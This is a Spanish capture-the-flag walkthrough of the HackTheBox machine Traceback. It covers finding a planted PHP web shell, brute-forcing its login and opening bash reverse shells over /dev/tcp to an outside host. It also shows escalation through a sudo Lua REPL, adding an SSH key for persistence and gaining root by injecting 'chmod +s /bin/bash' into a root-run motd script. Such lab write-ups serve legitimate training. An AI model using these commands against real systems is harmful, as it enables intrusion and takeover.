10.10.10.181
------------

1. Enumeracion,  (usando el script en bash), tenemos el puerto 22(ssh) y 80(http) abiertos.
Escaneando luego con nmap
```console
└─$ nmap -sCV -T5 -p22,80 10.10.10.181
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Help us
|_http-server-header: Apache/2.4.29 (Ubuntu)
└─$ whatweb http://10.10.10.181
http://10.10.10.181 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.181], Title[Help us]
```
La web (puerto 80) parece que ha sido hackeada por un tal "- Xh4H -" y dice que ha dejado una puerta trasera.

En el codigo fuente no he encontrado la gran cosa. Voy a por el fuzzing de rutas:
```console
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.181/FUZZ
000045226:   200        44 L     151 W      1113 Ch     "http://10.10.10.181/"                               
000095510:   403        11 L     32 W       300 Ch      "server-status"  
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.181/FUZZ.php
000045226:   403        11 L     32 W       291 Ch      "http://10.10.10.181/.php"
```

Hay un .php pero es 403 forbidden. En el codigo fuente pone: 
```<!--Some of the best web shells that you might need ;)-->```
Poniendo eso en google sale esta [pagina](https://github.com/TheBinitGhimire/Web-Shells).
En el codigo fuente de esa pagina hay muchos nombres de shell, vamos a filtrarlos
```console
└─$ curl -s https://github.com/TheBinitGhimire/Web-Shells | grep "<td>" | grep -v "a href" > rutas
└─$ cat rutas | sed s/\<td\>//g |  awk '{print $1}' FS="<" | sponge rutas
└─$ wfuzz -c --hc=404 -t 200  -w ./rutas http://10.10.10.181/FUZZ
000000018:   200        58 L     100 W      1261 Ch     "smevk.php"
```
Viendo el codigo fuente de esa backdoor, es un script php que parece corto pero tiene una cadena en base64 
que al decodificarla sale otro script php de mas de 1000 lineas.

Esa backdoor pide usuario y contraseña. La peticion es tal que asi: 
```POST a smevk.php 'uname=test&pass=test&login=Login' con la cookie "PHPSESSID=7j3e4easretd87ei5haaicp0ok"```

Intente fuzzear la contraseña con el usaurio "Xh4H" con mi script FuzzDaPass pero no dio resultado, en cambio
admin si (el usuario por defecto que prueba).

```console
└─$ FuzzDaPass.py -t 'http://10.10.10.181/smevk.php' -f "uname:pass"  
Frase de error ej 'Incorrect username or password.'>   Wrong Password or UserName :(
Frase de error por intentos, ej 'Blacklist protection' >  test
   > Intento [33] 38.135.230.218	purple
   > Intento [34] 38.135.230.218	admin
[*] La contraseña para [admin] es [admin]
```
Tengo que avisar que  mi rockyuu (el diccionario que usa por defecto) esta ligeramente modificado. (ej la 
contraeña admin va mucho antes). Hay una linea para poner comandos a ejecutar en el sistema.

Pongo el comando de la reverse shell y con netcat a la escucha en el puerto 443 ```bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'```
Entro al sistema.

Enumeracion con mi [script](https://github.com/CUCUxii/Lin_info_xii.sh)
- Estamos con el usuario "webadmin"
- No hay capabilities ni SUIDS importantes
- Puedo ejecutar este script como root sin dar contraseña "/home/sysadmin/luvit"
- Nuestro usaurio ha ejecutado estos comandos:
```console
ls -la
sudo -l
nano privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
rm privesc.lua
logout
```
Nuestro usuario tiene un nota:
```
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```
Con Lua la manera de meter comandos al sistema es entablarse una bash:
```console
webadmin@traceback:/home/webadmin$ sudo -u sysadmin /home/sysadmin/luvit
Welcome to the Luvit repl!
> os.execute("/bin/sh")
$ whoami
sysadmin
$ bash -c 'bash -i >& /dev/tcp/10.10.14.7/444 0>&1'
```
Entre al sistema con ```nc -nlvp 444```. Tambien puse mi llave en su authorized keys para entrar por ssh.
```
sysadmin@traceback:~/.ssh$ nano authorized_keys
sysadmin@traceback:~/.ssh$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2...YzPjys= cucuxii@kali-xii
```
Con este usaurio, corremos el script de enumeracion otra vez y encontramos que:

```console
root        430  0.0  0.0  31320  3252 ?        Ss   09:32   0:00 /usr/sbin/cron -f
root       1381  0.0  0.0  58792  3216 ?        S    09:56   0:00  \_ /usr/sbin/CRON -f
root       1384  0.0  0.0   4628   804 ?        Ss   09:56   0:00      \_ /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
```
Es decir hacen una copia del archivo *update_motd.d* en /var/backups cada 30 segundos (y supongo que tambien ejecutarlo)

```console
sysadmin@traceback:/etc/cron.d$ cd /etc/update-motd.d/
sysadmin@traceback:/etc/update-motd.d$ ls
00-header  10-help-text  50-motd-news  80-esm  91-release-upgrade
```
En el 00-header pone ```echo "\nWelcome to Xh4H land \n"``` que es lo que nos salio al hacer shh.

Le añadi la linea ```chmod +s /bin/bash``` a 80-esm para hacer una bash SUID y ejecute esto antes de los 30
segundos.

```console
sysadmin@traceback:/etc/update-motd.d$ nano 80-esm 
sysadmin@traceback:/etc/update-motd.d$ bash -p     
bash-4.4# whoami
root
bash-4.4# cat /root/root.txt
c55e935719296d81297ab57e6dca6983
```

